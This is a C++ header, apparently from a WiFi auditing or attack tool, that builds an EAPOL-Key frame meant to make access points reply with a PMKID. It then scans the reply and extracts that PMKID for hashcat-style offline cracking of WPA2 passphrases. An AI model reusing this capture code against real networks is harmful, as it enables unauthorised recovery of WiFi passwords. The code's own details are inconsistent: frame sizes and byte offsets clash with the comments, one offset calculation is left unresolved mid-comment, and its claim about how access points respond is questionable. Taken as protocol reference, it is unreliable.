#pragma once
// EAPOL — minimal builder + parser for the WPA "M1" key frame and the
// PMKID inside the WPA Key Data field. Used by Phase 5.4 PMKID-only
// capture mode.
//
// References:
//   - IEEE 802.11-2016 §12.7 (key descriptor)
//   - hashcat 22000 mode (PMKID*MAC_AP*MAC_STA*ESSID)
//   - Bastille / Steube: PMKID attack on PSK 4-way handshakes
#include <cstddef>
#include <cstdint>
#include <cstring>

namespace yui::eapol {

constexpr uint8_t kEthertypeHigh = 0x88;
constexpr uint8_t kEthertypeLow  = 0x8E;
constexpr uint8_t kEapolKey      = 0x03;
constexpr uint8_t kKeyDescRsn    = 0x02;        // RSN (WPA2)

// Build a minimal 99-byte EAPOL-Key M1-style frame the way an AP would
// send it. Embedded inside an LLC/SNAP-prefixed data frame, it triggers
// most APs to reply with an M1 carrying the PMKID. Returns bytes
// written, 0 on buffer overflow.
//
// out layout:
//   bytes 0..7   : LLC/SNAP (AA AA 03 00 00 00 88 8E)
//   bytes 8..10  : EAPOL header (version=2, type=Key, body_len=95)
//   bytes 11..   : Key descriptor (95 bytes)
inline std::size_t build_m1_request(uint8_t* out, std::size_t cap) {
  constexpr std::size_t kTotal = 8 + 3 + 95;
  if (!out || cap < kTotal) return 0;
  std::memset(out, 0, kTotal);

  // LLC/SNAP
  out[0] = 0xAA; out[1] = 0xAA; out[2] = 0x03;
  out[6] = kEthertypeHigh; out[7] = kEthertypeLow;

  // EAPOL header: version=2 (802.1X-2004), type=EAPOL-Key, length=95
  out[8]  = 0x02;
  out[9]  = kEapolKey;
  out[10] = 0x00;            // length high
  out[11] = 95;              // length low

  // Key descriptor: type=RSN
  out[12] = kKeyDescRsn;

  // Key info: bit 3 = key type (1 = pairwise), bit 6 = ACK
  out[13] = 0x00; out[14] = 0x8A;

  // Key length = 16 (CCMP)
  out[15] = 0x00; out[16] = 0x10;
  // Replay counter, nonce, etc. left as zero — APs reply to a
  // syntactically-valid M1 regardless. Real-world hardware uses a
  // monotonic replay counter; tests don't care.
  return kTotal;
}

// Look at the Key Data field of an inbound EAPOL-Key M1 reply. If the
// AP included a PMKID KDE (RSN suite OUI 00:0F:AC, type 04), copy the
// 16-byte PMKID into out and return true.
//
// Caller passes the pointer to the start of the *EAPOL body* (right
// after the LLC/SNAP + EAPOL header — i.e. the 99-ish bytes the AP
// puts on the wire). For a frame coming off an 802.11 monitor, that's
// `frame + dot11_hdr_len + 8`.
inline bool extract_pmkid(const uint8_t* eapol_body, std::size_t len,
                          uint8_t out_pmkid[16]) {
  if (!eapol_body || !out_pmkid || len < 22) return false;
  // EAPOL body starts at offset 0 (the body, not the LLC). Its key
  // descriptor begins at offset 3 (version, type, body_len_be).
  // Key descriptor body is 95 bytes. The Key Data field begins at
  // descriptor offset 80 (preceded by 3 + 1 + 2 + 2 + 16 + 32 + 16 +
  // 8 + 8 + 16 = 102 bytes from the body start? Let's just scan the
  // tail for the PMKID OUI.) — pragmatic: scan for KDE pattern.
  //
  // KDE: tag=0xDD (vendor-specific), len, OUI=00:0F:AC, type=0x04,
  //      then 16 bytes PMKID.
  for (std::size_t i = 0; i + 22 <= len; ++i) {
    if (eapol_body[i]     != 0xDD) continue;
    if (eapol_body[i + 1] <  20)   continue;
    if (eapol_body[i + 2] != 0x00) continue;
    if (eapol_body[i + 3] != 0x0F) continue;
    if (eapol_body[i + 4] != 0xAC) continue;
    if (eapol_body[i + 5] != 0x04) continue;
    std::memcpy(out_pmkid, eapol_body + i + 6, 16);
    return true;
  }
  return false;
}

}  // namespace yui::eapol
